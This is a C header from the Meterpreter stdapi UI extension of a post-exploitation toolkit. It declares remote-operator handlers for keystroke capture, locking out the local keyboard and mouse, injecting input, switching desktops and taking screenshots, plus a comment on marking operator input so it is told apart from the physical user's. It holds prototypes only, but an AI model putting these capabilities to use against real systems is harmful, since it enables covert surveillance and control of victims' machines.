#ifndef _METERPRETER_SOURCE_EXTENSION_STDAPI_STDAPI_SERVER_UI_UI_H
#define _METERPRETER_SOURCE_EXTENSION_STDAPI_STDAPI_SERVER_UI_UI_H

// Local input suppression. Formerly implemented by a resource-extracted
// hook.dll; now inlined in ui.c. mouse.c/keyboard.c call the two setters,
// and tag their SendInput calls with input_gate_marker() so the LL hook
// procs can distinguish operator-generated events from physical input
// without relying on the LLMHF_INJECTED flag.
DWORD input_gate_set_mouse(BOOL allow);
DWORD input_gate_set_kb(BOOL allow);
ULONG_PTR input_gate_marker(void);

DWORD request_ui_enable_keyboard(Remote *remote, Packet *request);
DWORD request_ui_enable_mouse(Remote *remote, Packet *request);
DWORD request_ui_get_idle_time(Remote *remote, Packet *request);

DWORD request_ui_start_keyscan(Remote *remote, Packet *request);
DWORD request_ui_stop_keyscan(Remote *remote, Packet *request);
DWORD request_ui_get_keys_utf8(Remote *remote, Packet *request);

DWORD request_ui_send_keys(Remote *remote, Packet *request);
DWORD request_ui_send_keyevent(Remote *remote, Packet *request);
DWORD request_ui_send_mouse(Remote *remote, Packet *request);

DWORD request_ui_desktop_enum( Remote * remote, Packet * request );
DWORD request_ui_desktop_get( Remote * remote, Packet * request );
DWORD request_ui_desktop_set( Remote * remote, Packet * request );
DWORD request_ui_desktop_screenshot( Remote * remote, Packet * request );

#endif
